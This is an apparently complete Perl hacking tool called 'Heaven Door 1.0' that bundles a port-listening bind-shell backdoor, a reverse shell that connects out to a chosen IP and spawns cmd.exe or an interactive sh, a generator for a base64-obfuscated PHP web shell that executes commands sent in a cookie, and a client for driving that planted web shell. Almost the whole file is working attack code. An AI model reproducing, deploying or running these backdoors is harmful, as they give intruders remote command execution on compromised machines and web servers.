# !usr/bin/perl
# Heaven Door 1.0
# (C) Doddy Hackman 2016

use LWP::UserAgent;
use MIME::Base64;
use IO::Socket;
use IO::Socket::SSL;
use Cwd;
use Getopt::Long;
use Color::Output;
Color::Output::Init;

GetOptions(
	"backdoor"   => \$backdoor,
	"reverse"   => \$reverse,
	"ip=s"   => \$ip,
    "port=s"   => \$port,
    "generate_backdoor"  => \$generate_backdoor,
    "filename=s"  => \$filename,
    "connect_backdoor"   => \$connect_backdoor,
    "url=s"   => \$url
);

head();

if ($backdoor) {
	if($backdoor && $port) {
		backdoor($port);
	} else {
		sintax();
	}	
}
elsif ($reverse) {
	if($reverse && $ip && $port) {
		reverse_shell($ip,$port);
	} else {
		sintax();
	}
}
elsif ($generate_backdoor) {
	if($filename) {
		cargar_generador_backdoor($filename);
	} else {
		sintax();
	}
}
elsif ($connect_backdoor) {
	if($url) {
		cargar_consola_backdoor($url);
	} else {
		sintax();
	}
}
else {
    sintax();
}

copyright();

# Functions

# Simple backdoor

sub backdoor {
	
	my($port) = @_;
	
	$backdoor = IO::Socket::INET->new(Proto=> 'tcp',LocalPort =>$port,Listen=> SOMAXC,Reuse=> 1);

	printear("[+] Heaven_Door : ");
	print "Online\n";
	printear("[+] Port : ");
	print "$port\n";
	printear("[+] PID : ");
	print "$$\n\n";
	
	printear_titulo("[+] Connected");

	while ($jesus = $backdoor->accept()) {
		$jesus->autoflush(1);
		print $jesus "[+] Heaven_Door : Online\n[+] Port : 25256\n[+] PID : ".$$."\n\n";
		print $jesus "Welcome  ".$jesus->peerhost."\n\n";
		&extras;
		$dir = getcwd();
		print $jesus $dir.">>";
		while (<$jesus>) {
			my $yeah = qx($_);
			print $jesus "\n\n".$yeah."\n\n";
			print $jesus $dir.">>";
		}
	}

	sub extras {

		if ($^O =~/Win32/ig) {
			use if $^O eq "MSWin32", "Win32";
			print $jesus "[+] Domain Name : ".Win32::DomainName()."\n";
			print $jesus "[+] OS Version : ".Win32::GetOSName()."\n";
			print $jesus "[+] Username : ".Win32::LoginName()."\n\n";
		} else {
			$output =  `uname -a`;
			print $jesus "--==System Info==--\n\n".$output."\n";
		}
	}
	
} 

#

# Reverse Shell

sub reverse_shell {
	my($ip,$port) = @_;
	printear_titulo("[+] Reverse Shell : ");
	print "Loaded\n\n";
	printear("[+] IP to connect : ");
	print $ip."\n";
	printear("[+] Port : ");
	print $port."\n\n";
	printear_logo("[+] Connecting ...\n\n");
	socket(REVERSE, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
	connect(REVERSE, sockaddr_in($port,inet_aton($ip)));
	printear_titulo("[+] Reverse Shell successful\n\n");
	open (STDIN,">&REVERSE");
	open (STDOUT,">&REVERSE");
	open (STDERR,">&REVERSE");
	tipo();
	printear_logo("[+] Disconnecting ...\n\n");
}

sub tipo {
	if ($^O =~/Win32/ig) {
		infowin();
	system("cmd.exe");
	} else {
		infolinux();
		system("export TERM=xterm;exec sh -i");
	}
}

sub infowin {
	use if $^O eq "MSWin32", "Win32";
	print "[+] Domain Name : ".Win32::DomainName()."\n";
	print "[+] OS Version : ".Win32::GetOSName()."\n";
	print "[+] Username : ".Win32::LoginName()."\n\n";
}

sub infolinux {
	print "[+] System information\n\n";
	system("uname -a");
	print "\n";
}

#

# More Functions

sub cargar_consola_backdoor {
	printear("[+] Checking Backdoor ...\n\n");
	my $check1 = cargar_comando($url,"ver");
	my $check2 = cargar_comando($url,"uname -a");
	if(check_backdoor($check1) or check_backdoor($check2)) {
		printear_logo("[+] Backdoor Loaded\n");
		my($url) = @_;
		while(1) {
			printear("\n[+] Command : ");
			chomp( my $comando = <stdin> );
			if ( $comando =~ /exit/ ) {
				copyright();
			}
			my $code = cargar_comando($url,$comando);
			if(check_backdoor($code)) {
				my $output = extract_command_backdoor($code);
				if($output ne "") {
					printear_titulo("\n".$output."\n");
				} else {
					printear_titulo("\n"."[-] Invalid command"."\n");	
				}
			} else {
				printear_titulo("\n"."[-] Invalid command"."\n");
			}
		}
	} else {
		printear_logo("[+] Backdoor not exists\n");
	}
}

sub check_backdoor {
	my $text = shift;
	if($text=~/\[code\_heaven\](.*?)\[\/code\_heaven\]/s) {
		return 1;
	} else {
		return 0;
	}
}

sub extract_command_backdoor {
	my $text = shift;
	if($text=~/\[code\_heaven\](.*?)\[\/code\_heaven\]/s) {
		return $1;
	} else {
		return "";
	}
}

sub cargar_generador_backdoor {
	my $filename = shift;
	if(-f $filename) {
		unlink($filename);
	}
	printear_titulo("[+] Generating backdoor ...\n\n");
	generar_backdoor($filename);
	if(-f $filename) {
		printear("[+] Backdoor $filename generated !\n");
	} else {
		printear("[-] Error generating backdoor\n");
	}
}

sub generar_backdoor {
	my $filename = shift;
	my $code = "PD9waHAgaWYgKGlzc2V0KCRfQ09PS0lFWyJoZWF2ZW5fZG9vcl9oZXJlIl0pICYmICFlbXB0eSgkX0NPT0tJRVsiaGVhdmVuX2Rvb3JfaGVyZSJdKSkgeyAJJGNvZGUgPSAiIjsgCSRvdXRwdXQgPSAiIjsgCWV4ZWMoJF9DT09LSUVbImhlYXZlbl9kb29yX2hlcmUiXSwkY29kZSk7IAlmb3JlYWNoICgkY29kZSBhcyAkbGluZSkgeyAJCSRvdXRwdXQgPSAkb3V0cHV0IC4gJGxpbmUuIlxuIjsgCX0gCWVjaG8gYmFzZTY0X2VuY29kZSgiW2NvZGVfaGVhdmVuXSIuJG91dHB1dC4iWy9jb2RlX2hlYXZlbl0iKTsgfSA";
	savefile($filename,decode_base64($code));
}

sub cargar_comando {
	my($url,$command) = @_;
	my $nave = LWP::UserAgent->new(ssl_opts => {verify_hostname => 0,SSL_verify_mode => IO::Socket::SSL::SSL_VERIFY_NONE});
	$nave->agent("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0");
	$nave->timeout(10);
	my $contenido = $nave->get($url,Cookie => "heaven_door_here=".$command)->content;
	return decode_base64($contenido);
}

sub savefile {
	my ($filename,$text) = @_;
	open( SAVE, ">>" . $filename );
	print SAVE $text . "\n";
	close SAVE;
}

sub printear {
    cprint( "\x036" . $_[0] . "\x030" );
}

sub printear_logo {
    cprint( "\x037" . $_[0] . "\x030" );
}

sub printear_titulo {
    cprint( "\x0310" . $_[0] . "\x030" );
}

sub sintax {

    printear("[+] Sintax : ");
    print "perl $0 <option> <value>\n";
    printear("\n[+] Options : \n\n");
    print "-backdoor -port <port> : Enable backdoor in port\n";
    print "-reverse -ip <ip> -port <port> : Get all tags GPS of a image\n";
    print "-generate_backdoor -filename <filename> : Generate backdoor in filename\n";
    print "-connect_backdoor -url <url> : Connect to backdoor in URL\n";
    printear("\n[+] Example : ");
    print "perl heaven_door.pl -reverse -ip 127.0.0.1 -port 666\n";
    copyright();
}

sub head {
    printear_logo("\n-- == Heaven Door 1.0 == --\n\n\n");
}

sub copyright {
    printear_logo("\n\n-- == (C) Doddy Hackman 2016 == --\n\n");
    exit(1);
}

#The End ?
